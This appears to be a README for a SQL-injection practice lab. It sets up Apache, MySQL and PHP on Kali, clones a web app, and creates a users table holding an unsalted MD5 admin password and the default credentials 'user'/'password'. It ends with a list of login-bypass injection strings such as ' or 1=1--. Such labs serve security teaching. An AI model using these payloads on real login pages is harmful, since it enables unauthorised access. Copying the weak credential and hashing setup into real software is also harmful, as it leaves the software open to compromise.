# Install Linux, Apache, MySQL, PHP  stack on Kali linux v20.4
  ## Step 1: Install Apache 
  ```sh 
   sudo apt-get update
   sudo apt-get install apache2
  ```
  ## Step 2: Install MySQL
  ```sh 
   $sudo apt update
   $sudo apt-get install mysql-server
   $sudo apt install mariadb-server
  ```
  ## Installing MariaDB
  ```sh 
   $sudo apt update
   $sudo apt install mariadb-server
  ```
 ## Download the Code :
 ```sh 
   git clone https://github.com/anir0y/verzeo-webapp 
  ```
  ## Copying the Downloaded folder
  ```sh
  /var/www/html/
  ```
  ## Starting the Services(Apache2,MySql)
  ```sh
  $sudo service apache2 start
  $sudo service mysql start
  ```
  ## Connecting the server with database
  ```sh
  $sudo mysql -u root
  ```
  > Creating a Table

```sh
     CREATE TABLE IF NOT EXISTS `users` (
     `id` int(11) NOT NULL AUTO_INCREMENT,
     `username` varchar(200) NOT NULL,
     `password` varchar(33) NOT NULL,
      PRIMARY KEY (`id`)
   )  ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=66 ;
```
> Inserting Values into the table
```sh
INSERT INTO `users` (`id`, `username`, `password`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3');
```
## Creating User and granting permission
```sh
>create user 'user'@'localhost' identified by 'password';
>grant all privileges on 'table'.* to 'user'@'localhost' identified by 'password';
```
## Changing the Configuration file on dbconf
```sh
<?php
$con = new mysqli("127.0.0.1", "user", "password", "table");
if ($con -> connect_error){
    die("Database Not Congigured Properly");
}
else{
   // echo ("DB connection is established sir");
}
?>
```
## Next Steps
```sh
  Open any Web browser and try to connect the webserver <mark>127.0.0.1/database/index.php/</mark>
```   
# Steps to Bypass the Login Webpage
> Using sql injection trying different approached.
  * SQL Injection 101, Login tricks

     * admin' --
     * admin' #
     * admin'/*
     * ' or 1=1--
     * ' or 1=1#
     * ' or 1=1/*
     * ') or '1'='1--
     * ') or ('1'='1--
> ![Final](Capture1.png)



